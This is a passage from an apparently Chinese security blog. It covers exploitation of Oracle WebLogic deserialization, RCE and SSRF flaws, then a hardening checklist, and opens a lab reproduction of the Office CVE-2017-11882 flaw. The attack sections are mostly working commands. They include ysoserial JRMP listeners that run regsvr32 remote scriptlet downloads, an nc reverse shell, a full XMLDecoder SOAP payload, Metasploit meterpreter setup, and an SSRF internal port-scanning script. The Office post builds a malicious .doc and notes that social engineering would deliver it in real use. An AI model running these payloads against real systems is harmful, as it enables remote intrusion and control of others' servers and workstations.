<p>Weblogic 10.3.6.0<br>Weblogic 12.1.3.0<br>Weblogic 12.2.1.2<br>Weblogic 12.2.1.3</p>
</blockquote>
<p><strong>漏洞验证</strong></p>
<p>依然是先快速验证下目标是否存在此漏洞 [ 注意,目标如果用的是非默认的 7001 端口,则需要自行到脚本中去稍微改下 ]:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 ' regsvr32 /s /n /u /i:http://192.168.3.14:8080/PhgWw1pQB6uBg.sct scrobj.dll'</span><br><span class="line"><span class="meta">#</span>win 平台反弹 meterpreter</span><br><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.3.233 110 &gt;/tmp/f'</span><br><span class="line"><span class="meta">#</span>linux反弹bash</span><br></pre></td></tr></table></figure>
<p>看到会话回来此处就可以立即 ctrl + c 了,很显然,既然可以弹 meterpreter,那也就一定可以弹 beacon。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python CVE-2018-2628-exploit.py [目标IP] 7001 ysoserial.jar 192.168.3.14 1099 JRMPClient</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/script/web_delivery msf &gt; set target 3</span><br><span class="line">msf &gt; set payload windows/meterpreter/reverse_tcp_rc4_dns msf &gt; set lhost 192.168.3.14</span><br><span class="line">msf &gt; set lport 53</span><br><span class="line">msf &gt; set rc4password klionsec msf &gt; exploit –j</span><br><span class="line">msf &gt; sessions -i 1</span><br><span class="line">meterpreter &gt; sysinfo meterpreter &gt; getuid</span><br></pre></td></tr></table></figure>
<h3 id="5、反序列化-CVE-2017-10271"><a href="#5、反序列化-CVE-2017-10271" class="headerlink" title="5、反序列化[CVE-2017-10271]"></a>5、反序列化[CVE-2017-10271]</h3><p>漏洞基本原理：即 wls wsat 模块的 RCE,究其底层其实还是 XMLDecoder 的反序列化漏洞 </p>
<p><strong>poc</strong>：<a href="https://github.com/hanc00l/weblogic_wls_wsat_rce" target="_blank" rel="noopener">https://github.com/hanc00l/weblogic_wls_wsat_rce</a> </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python weblogic_wls_wsat_exp.py -t 172.16.80.131:7001</span><br></pre></td></tr></table></figure>
<p><strong>poc</strong>：</p>
<p><a href="http://www.bugsafe.cn/archives/136.html" target="_blank" rel="noopener">http://www.bugsafe.cn/archives/136.html</a></p>
<p>首先,快速验证目标是否存在此漏洞,浏览器访问 poc url : /wls-wsat/CoordinatorPortType 看到类似下面的返回则说明目标机器可能存在此漏洞<br>http://[目标IP] /wls-wsat/CoordinatorPortType    </p>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/181017/aLlLklAHla.png?imageslim" alt="mark"></p>
<p>而后,直接把下面的请求贴到 burpsuite 的 repeater 模块中进行请求,以此在目标机器上触发漏洞并执行我们的 payload,具体如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: 192.168.3.195</span><br><span class="line">Accept-Encoding: identity Content-Length: 695</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3</span><br><span class="line">Connection: keep-alive Cache-Control: max-age=0</span><br><span class="line">Content-Type: text/xml</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;</span><br><span class="line">&lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;</span><br><span class="line">&lt;java version="1.8.0_131" class="java.beans.XMLDecoder"&gt;</span><br><span class="line">&lt;void class="java.lang.ProcessBuilder"&gt;</span><br><span class="line">&lt;array class="java.lang.String" length="3"&gt;</span><br><span class="line">&lt;void index="0"&gt;</span><br><span class="line">&lt;string&gt;cmd.exe&lt;/string&gt; #于执行 payload 代码的命令解释器,如果是在 linux 中,此处通常应该为/bin/bash</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index="1"&gt;</span><br><span class="line">&lt;string&gt;/c&lt;/string&gt; #不交互,在 linux 下的选项写法为-c</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index="2"&gt;</span><br><span class="line"><span class="meta">string&gt;</span>regsvr32 /s /n /u /i:http://192.168.3.14:8080/PhgWw1pQB6uBg.sct scrobj.dll&lt;/string&gt;	实际要执行的 payload 代码,直接远程下载执行,linux 中可以用 wget 或者 curl,然后管道交给 bash 去执行</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method="start"/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>
<p>点击’go’ 之后便 meterpreter 已正常回连</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/script/web_delivery msf &gt; set target 3</span><br><span class="line">msf &gt; set payload windows/meterpreter/reverse_tcp_rc4_dns </span><br><span class="line">msf &gt; set lhost 192.168.3.14</span><br><span class="line">msf &gt; set lport 53</span><br><span class="line">msf &gt; set rc4password klionsec msf &gt; exploit -j</span><br></pre></td></tr></table></figure>
<p><strong>msf模块</strong></p>
<p>exploit/multi/http/oracle_weblogic_wsat_deserialization_rce    </p>
<h3 id="6、-反序列化-CVE-2017-3248"><a href="#6、-反序列化-CVE-2017-3248" class="headerlink" title="6、    反序列化[CVE-2017-3248]"></a>6、    反序列化[CVE-2017-3248]</h3><blockquote>
<p>影 响 版 本 : Weblogic 10.3.6.0<br>Weblogic 12.1.3.0<br>Weblogic 12.2.1.0<br>Weblogic 12.2.1.1</p>
</blockquote>
<p>指定目标目标 weblogic 的 ip 端口和 JRMP 监听器的 ip [实战中肯定会直接放到自己的 vps 上搞] 端口[回连下载自己 payload 用的]</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exploit-CVE-2017-3248-bobsecq.py -t 192.168.3.195 -p 7001 --jip 192.168.3.14 --jport 1099 --cmd "regsvr32 /s /n /u /i:http://192.168.3.14:8080/y8kizans5Oa7F.sct scrobj.dll" --ysopath ysoserial.jar</span><br></pre></td></tr></table></figure>
<p>上面执行完以后,脚本会提示你启动 JRMP 监听,此时另起一个终端执行该监听,而后再回到上面去继续敲回车执行我们的 payload<br>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 ‘regsvr32 /s /n /u /i:<a href="http://192.168.3.14:8080/y8kiz" target="_blank" rel="noopener">http://192.168.3.14:8080/y8kiz</a> ans5Oa7F.sct scrobj.dll’    起监听,等待远程连接下载执行相应的 payload    </p>
<p>最后,便会看到目标机器的 meterpreter 正常被弹回</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 'regsvr32 /s /n /u /i:http://192.168.3.14:8080/y8kiz ans5Oa7F.sct scrobj.dll'	起监听,等待远程连接下载执行相应的 payload</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/script/web_delivery msf &gt; set target 3</span><br><span class="line">msf &gt; set payload windows/meterpreter/reverse_tcp_rc4_dns msf &gt; set lhost 192.168.3.14</span><br><span class="line">msf &gt; set lport 53</span><br><span class="line">msf &gt; set rc4password klionsec</span><br><span class="line">msf &gt; exploit -j</span><br></pre></td></tr></table></figure>
<h3 id="7、-代码执行-CVE-2016-3510"><a href="#7、-代码执行-CVE-2016-3510" class="headerlink" title="7、    代码执行[CVE-2016-3510]"></a>7、    代码执行[CVE-2016-3510]</h3><p>poc:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python weblogic-CVE-2016-3510.py 192.168.3.195:7001 "regsvr32 /s /n /u /i:http://192.168.3.14:8080/y8kizans5Oa7F.sct scrobj.dll" --ysoserial-path ysoserial.jar</span><br></pre></td></tr></table></figure>
<h3 id="8、-代码执行-CVE-2015-4852"><a href="#8、-代码执行-CVE-2015-4852" class="headerlink" title="8、    代码执行[CVE-2015-4852]"></a>8、    代码执行[CVE-2015-4852]</h3><blockquote>
<p>受影响版本:<br>Oracle WebLogic Server, versions 10.3.6.0, 12.1.2.0, 12.1.3.0 and 12.2.1.0</p>
</blockquote>
<p>直接利用 t3 协议反弹目标机器的 cmd shell</p>
<blockquote>
<p>python weblogic.py -u 192.168.3.11 -p 7001 -os win -t reverse_shell –LHOST 192.168.3.14 –LPORT 8081    </p>
</blockquote>
<blockquote>
<p>nc -lvvp 8081    </p>
</blockquote>
<h3 id="9、Weblogic-ssrf"><a href="#9、Weblogic-ssrf" class="headerlink" title="9、Weblogic ssrf"></a>9、Weblogic ssrf</h3><p>Weblogic ssrf url 如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.195:7001/uddiexplorer/SearchPublicRegistries.jsp</span><br><span class="line">poc url: /uddiexplorer/SearchPublicRegistries.jsp?operator=http://localhost/robots.txt&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp; txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search</span><br></pre></td></tr></table></figure>
<p>探测内网开放端口:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> thread</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ite_ip</span><span class="params">(ip)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">        final_ip = <span class="string">'&#123;ip&#125;.&#123;i&#125;'</span>.format(ip=ip, i=i)</span><br><span class="line">        <span class="keyword">print</span> final_ip</span><br><span class="line">        thread.start_new_thread(scan, (final_ip,))</span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(final_ip)</span>:</span></span><br><span class="line">    ports = (<span class="string">'6379'</span>,<span class="string">'445'</span>,<span class="string">'8080'</span>,<span class="string">'3389'</span>,<span class="string">'1433'</span>,<span class="string">'1521'</span>,<span class="string">'3306'</span>,<span class="string">'80'</span>,<span class="string">'443'</span>,<span class="string">'7001'</span>,<span class="string">'8000'</span>)</span><br><span class="line">    <span class="keyword">for</span> port <span class="keyword">in</span> ports:</span><br><span class="line">        vul_url = args.url+<span class="string">'/uddiexplorer/SearchPublicRegistries.jsp?operator=http://%s:%s&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search'</span> % (final_ip,port)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#print vul_url</span></span><br><span class="line">            r = requests.get(vul_url, timeout=<span class="number">15</span>, verify=<span class="keyword">False</span>)</span><br><span class="line">            result1 = re.findall(<span class="string">'weblogic.uddi.client.structures.exception.XML_SoapException'</span>,r.content)</span><br><span class="line">            result2 = re.findall(<span class="string">'but could not connect'</span>, r.content)</span><br><span class="line">            result3 = re.findall(<span class="string">'No route to host'</span>, r.content)</span><br><span class="line">            <span class="keyword">if</span> len(result1) != <span class="number">0</span> <span class="keyword">and</span> len(result2) == <span class="number">0</span> <span class="keyword">and</span> len(result3) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'[!]'</span>+final_ip + <span class="string">':'</span> + port</span><br><span class="line">        <span class="keyword">except</span> Exception, e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">'Weblogic SSRF vulnerable exploit'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'--url'</span>, dest=<span class="string">'url'</span>, required=<span class="keyword">True</span>, help=<span class="string">'Target url'</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    ip = <span class="string">"192.168.4"</span></span><br><span class="line">    <span class="keyword">if</span> ip:</span><br><span class="line">        <span class="keyword">print</span> ip</span><br><span class="line">        ite_ip(ip)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"no ip"</span></span><br></pre></td></tr></table></figure>
<h2 id="0x02-安全加固"><a href="#0x02-安全加固" class="headerlink" title="0x02 安全加固"></a>0x02 安全加固</h2><p>1.1. 目的</p>
<p>   本规范明确了Weblogic应用服务器安全配置方面的基本要求。为了提高Weblogic应用服务器的安全性而提出的。<br>1.2. 范围<br>   本规范适用于XXXX使用的Weblogic应用服务器。<br>\2. 强化Weblogic主机<br>2.1. 强化操作系统网络服务<br>【说明】在安装Weblogic前加固底层的操作系统。<br>2.2. 使用可以防止非授权访问的文件系统<br>【说明】确保Weblogic主机的文件系统可以防止非授权访问，例如Windows的NTFS。<br>2.3. 限制Weblogic主机上的用户数量<br>【说明】理想状况下，主机上的帐号应为2个管理员权限的帐号，1个运行Weblogic的帐号。<br>2.4. 帐号和密码<br>【说明】避免使用明显可以猜测到的帐号如”system”,”admin”或者”administrator”。口令至少8位，并满足复杂度要求。<br>2.5. 访问Weblogic资源的帐号的唯一性<br>【说明】在操作系统上建立一个专门用于Weblogic的帐号。<br>【具体配置】<br>该帐号只能操作以下三个目录：<br>1)BEA主目录。该目录是BEA多个产品的共享目录。<br>2)Weblogic安装目录。该目录包括了所有的安装程序。<br>3)域目录。该目录包括了设置文件、安全文件、日志文件和J2EE应用等。<br>赋予该帐号对以上三个目录读写执行权限。<br>2.6. 使用特殊帐号Run Weblogic Server Windows服务<br>【说明】在Windows平台，可以以Windows服务的方式运行Weblogic Server实例。这样会导致每次启动Windows自动执行Weblogic Server。而且不要以Windows administrator权限运行Weblogic Server。<br>【具体配置】<br>如何以一个特殊非管理员帐号运行Weblogic Server请参考以下：  </p>
<p> <a href="http://e-docs.bea.com/wls/docs70/adminguide/startstop.html#Setting_Up_a_Weblogic_Server_as_a_Windows_Service" target="_blank" rel="noopener">http://e-docs.bea.com/wls/docs70/adminguide/startstop.html#Setting_Up_a_Weblogic_Server_as_a_Windows_Service</a></p>
<p>验证以一个特殊非管理员帐号运行Weblogic Server请参考以下：</p>
<p> <a href="http://e-docs.bea.com/wls/docs70/adminguide/startstop.html#VerifyUserAccountForWinService" target="_blank" rel="noopener">http://e-docs.bea.com/wls/docs70/adminguide/startstop.html#VerifyUserAccountForWinService</a><br>2.7. 不在生产机上开发<br>【说明】在开发环境中开发相应的代码，经过测试后将代码转移到生产机上。此举是为了防止开发过程中的Bug影响生产环境。<br>【具体配置】  验证DocumentRoot包括以下设置：  </p>
<p>Order allow,deny Allow from all<br>Options None<br>AllowOverride None<br>​<br>2.8. 不在生产机上安装开发和sample软件<br>【说明】将开发工具从生产机上移除可以防止该工具被入侵者利用，一定程度地访问生产系统。<br>2.9. 启动安全审计<br>【说明】如果Weblogic运行的操作系统支持对文件和目录访问的安全审计，建议使用日志跟踪对文件和目录的拒绝访问。<br>【具体配置】<br>使用ModSecurity Core Rules限制请求的方式： </p>
<p>modsecurity_crs_30_http_policy.conf 文件包括以下的规则，</p>
<p># allow request methods</p>
<p>#</p>
<p># TODO Most applications only use GET, HEAD, and POST request</p>
<p># methods, if so uncomment the line below. Otherwise you are advised </p>
<p># to edit the line before uncommenting it.</p>
<p>#  </p>
<p>SecRule REQUEST_METHOD “!^((?:(?:POS|GE)T|OPTIONS|HEAD))$” \<br>“phase:1,log,auditlog,status:501,msg:’Method is not allowed by policy’, severity:’2’,,id:’960032’,”<br>2.10. 应用最新的BEA补丁，考虑实施官方最新的安全建议<br>【说明】如题<br>【具体配置】<br>注册BEA Advisories &amp; Notifications（<a href="http://dev2dev.bea.com/advisories" target="_blank" rel="noopener">http://dev2dev.bea.com/advisories</a>）以便收到最新的安全建议信息。  </p>
<p>从<a href="http://commerce.beasys.com/downloads" target="_blank" rel="noopener">http://commerce.beasys.com/downloads</a>.可以下载Service Pack<br>\3. 强化网络连接<br>3.1. 使用防火墙或Weblogic Server connection filters<br>【说明】建议使用防火墙限制Weblogic Server域外到域的连接；使用Connection Filters限制Weblogic Server域内的连接。更多信息可参考<br><a href="http://e-docs.bea.com/wls/docs70/secmanage/domain.html#connection_filter" target="_blank" rel="noopener">http://e-docs.bea.com/wls/docs70/secmanage/domain.html#connection_filter</a><br>3.2. 使用管理端口来承载管理的流量 </p>
<p>【说明】建议使用域范围内的管理端口 Administration Port来限制同一Weblogic Server域内的server instances间的流量都经过同一端口。当不使用管理端口时，管理流量会以明文形式在网上传输。管理端口另一个好处是当遭受到拒绝服务攻击时，仍然可以通过该端口管理Weblogic Server。</p>
<p>配合Connection Filters使用，可以指定Weblogic Server只接受来自某一IP段的管理请求，并所有连接只通过一个端口。</p>
<p>使用管理端口可以保证客户端与管理控制台以加密的方式连接。 更多信息可以参考<br><a href="http://e-docs.bea.com/wls/docs70/ConsoleHelp/domain.html#enabling" target="_blank" rel="noopener">http://e-docs.bea.com/wls/docs70/ConsoleHelp/domain.html#enabling</a><br>3.3. 使用管理通道 </p>
<p>【说明】建议启用管理通道Administration Channel以确保服务器间的管理流量的安全性。没有管理通道，一些关键的管理信息会以明文传输。更多的信息可以参考<br><a href="http://e-docs.bea.com/wls/docs70/admin_domain/network.html" target="_blank" rel="noopener">http://e-docs.bea.com/wls/docs70/admin_domain/network.html</a></p>
<p>\4. 强化Weblogic安全服务<br>4.1. 部署符合生产环境的Security Provider<br>【说明】Weblogic Security Service使用了一个可插拔的安全架构，在这个架构下可以部署多个secuirty provider。缺省条件下，Weblogic Server包括其自身的security providers,该provider已经提供了完整的安全解决方案。<br>【具体配置】<br>确保恰当地部署了security providers.<br>可以通过以下位置验证：</p>
<p>Administration Console under the Security → Realms → RealmName→<br>Providers folder. </p>
<p>其它信息可以参考：<a href="http://e-docs.bea.com/wls/docs70/secmanage/realm.html" target="_blank" rel="noopener">http://e-docs.bea.com/wls/docs70/secmanage/realm.html</a><br>4.2. 使用SSL<br>【说明】为保证数据传输安全，建议使用SSL和HTTPS替代HTTP。Weblogic Server包括一系列的开发用的Private Keys，数字证书和truseted certificate authorities。每一个下载Weblogic Server的用户都拥有对这些证书的Private Keys。禁止使用展示用的identity &amp; trust.<br>设置SSL可以参考<a href="http://e-docs.bea.com/wls/docs70/secmanage/ssl.html" target="_blank" rel="noopener">http://e-docs.bea.com/wls/docs70/secmanage/ssl.html</a><br>4.3. 使用主机名验证<br>【说明】使用主机名验证以避免中间人攻击。缺省下，Weblogic SSL验证发起连接的主机是否经过授权，但实施SSL前主机名验证可能已经被禁止了。 </p>
<p>【具体配置】<br>确保使用了Hostname 可以通过以下位置设置：<br> Administration Console on theServer s→ ServerName → Connections → SSL<br>tab.<br>4.4. 防止拒绝服务<br>【说明】限制请求的大小和时间以防止拒绝服务攻击。Weblogic Server可以限制消息的大小和消息到达的最大时间。<br> 可以通过以下位置设置：Administration Console on the Servers →<br>ServerName →Connections → Protocols tab.<br>4.5. 设置帐号锁定和登录时间<br>【说明】限制请求的大小和时间以防止拒绝服务攻击。Weblogic Server可以限制消息的大小和消息到达的最大时间。<br> 可以通过以下位置设置：Administration Console on the Security → Realms<br>→ RealmName → User Lockouts tab.<br>4.6. 开启安全审计<br>【说明】如果开启了Weblogic Security Service提供的Auditing Provider，日志会存在以下位置：DomainName\DefaultAuditRecorder.log<br> 可以通过以下位置设置：Administration Console on the Security → Realms<br>→ RealmName → Providers → Auditors page. 更多信息可以参考：<br><a href="http://e-docs.bea.com/wls/docs70/ConsoleHelp/security_7x.html#auditprovider" target="_blank" rel="noopener">http://e-docs.bea.com/wls/docs70/ConsoleHelp/security_7x.html#auditprovider</a><br>4.7. 限制发送主机名和版本号<br>【说明】缺省条件下，当Weblogic Server响应HTTP请求时，在其HTTP响应的包头中包括服务器的名称和Weblogic版本号，这会导致服务器信息的泄漏。 </p>
<p>可以通过以下位置设置： </p>
<p> disable the Send Server Header Enabled attribute in the Administration Console. The attribute is located on the Server →ServerName → Connections → HTTP tab.<br>4.8. 默认安全角色<br>【说明】确保正确地将用户和组分配给默认的Weblogic Server Security roles. 缺省下，Weblogic是基于一系列的缺省安全角色和安全策略来保护资源。更多信息可以参考：</p>
<p><a href="http://e-docs.bea.com/wls/docs70/adminguide/secsysadm.html" target="_blank" rel="noopener">http://e-docs.bea.com/wls/docs70/adminguide/secsysadm.html</a></p>

      
    </div>
    <footer class="article-footer">
      
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/中间件安全/">中间件安全</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-Office远程代码执行漏洞（CVE-2017-11882）"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2017/12/01/Office远程代码执行漏洞（CVE-2017-11882）/">Office远程代码执行漏洞（CVE-2017-11882）</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2017/12/01/Office远程代码执行漏洞（CVE-2017-11882）/" class="article-date">
	  <time datetime="2017-12-01T09:52:08.000Z" itemprop="datePublished">2017-12-01</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Office远程代码执行漏洞（CVE-2017-11882）"><a href="#Office远程代码执行漏洞（CVE-2017-11882）" class="headerlink" title="Office远程代码执行漏洞（CVE-2017-11882）"></a>Office远程代码执行漏洞（CVE-2017-11882）</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>&emsp;&emsp;2017年11月14日微软公司披露潜伏达<strong>17年之久</strong>的office远程代码执行漏洞（CVE-2017-11882）。CVE-2017-11882允许攻击者在当前用户的上下文中运行任意代码，导致无法正确处理内存中的对象，即为“ Microsoft Office Memory Corruption Vulnerability “，<strong>栈溢出的远程执行漏洞</strong>。</p>
<p>​    该漏洞是在EQNEDT32.EXE组件的缓冲区溢出导致。当受害用户打开Office文档时就有可能被漏洞利用，危害极大。 原因是由于EQNEDT32.EXE进程读入包含MathType的ole数据。函数给Font Name数据分配的大小是0x24个字节，超过大小会造成栈缓冲区溢出。而程序在拷贝公式Font Name数据时没有对其长度进行校验，从而导致漏洞发生。</p>
<p>通杀以下<strong>没有更新</strong>的Office版本：</p>
<p>Microsoft Office 2000</p>
<p>Microsoft Office 2003</p>
<p>Microsoft Office 2007 Service Pack 3</p>
<p>Microsoft Office 2010 Service Pack 2</p>
<p>Microsoft Office 2013 Service Pack 1</p>
<p>Microsoft Office 2016</p>
<p>MicrosoftOffice 365</p>
<p>具体漏洞分析内容详见以下链接：<br><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11882" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11882</a></p>
<p><a href="https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about/" target="_blank" rel="noopener">https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about/</a></p>
<p><a href="https://cert.360.cn/warning/detail?id=5373beff9f40ba6de88eb04c3b7c2455" target="_blank" rel="noopener">https://cert.360.cn/warning/detail?id=5373beff9f40ba6de88eb04c3b7c2455</a></p>
<p><a href="https://www.anquanke.com/post/id/87311" target="_blank" rel="noopener">https://www.anquanke.com/post/id/87311</a></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="第一步-漏洞验证"><a href="#第一步-漏洞验证" class="headerlink" title="第一步 漏洞验证"></a>第一步 漏洞验证</h3><p>&emsp;&emsp;登录kali攻击机，进入用户home文件中的CVE-2017-1182-payload目录。</p>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180727/b8icLIKf9B.png?imageslim" alt="mark"></p>
<p>执行以下命令生成payload-cale.doc文件，为漏洞payload（漏洞利用程序），弹出计算机程序验证漏洞是否存在。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python CVE-2017-11882.py -c &quot;cmd.exe /c calc.exe&quot; -o payload-cale.doc</span><br></pre></td></tr></table></figure></p>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180727/KlKHk314gI.png?imageslim" alt="mark"></p>
<p>接下来要把payload-cale.doc文件上传到windows靶机，受害者打开doc文件，漏洞执行利用。</p>
<p>登录windows靶机，打开FTP服务器。直接payload-cale.doc文件上传到此靶机上，真实环境下可利用社会工程学。</p>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180727/b8Le52ee2g.png?imageslim" alt="mark"></p>
<p>打开FTP服务器。</p>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180727/8ELED7HHmd.png?imageslim" alt="mark"></p>
<p>在kali攻击机登录ftp。输入账号密码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.0.40  [靶机IP地址]</span><br><span class="line">college   college@root</span><br></pre></td></tr></table></figure>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180727/FajJL8475F.png?imageslim" alt="mark"></p>
<p>上传到靶机上，上传目录是桌面。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">put payload-cale.doc</span><br></pre></td></tr></table></figure>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180727/2AdIEE1BbF.png?imageslim" alt="mark"></p>
<p>成功上传到靶机桌面上。</p>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180727/3IGCFGijBH.png?imageslim" alt="mark"></p>
<p>点击payload-cale.doc文件可看到执行计算机弹窗效果，实验验证成功，说明靶机存在此漏洞。</p>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180727/feieClHfEe.png?imageslim" alt="mark"></p>
